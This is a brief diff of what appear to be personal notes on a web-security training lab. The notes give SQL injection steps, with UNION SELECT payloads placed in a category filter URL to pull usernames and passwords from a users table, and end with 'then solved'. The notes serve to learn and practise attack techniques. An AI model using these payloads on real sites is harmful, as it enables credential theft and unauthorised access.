@@ -66,3 +66,5 @@ TIP to find password:- ' UNION SELECT username, password FROM users--
     1.url/filter?category=Lifestyle'UNION+SELECT+NULL,NULL--
     2.url/filter?category=Lifestyle'UNION+SELECT+username,password+FROM+users--
     3.then solved
+
+#
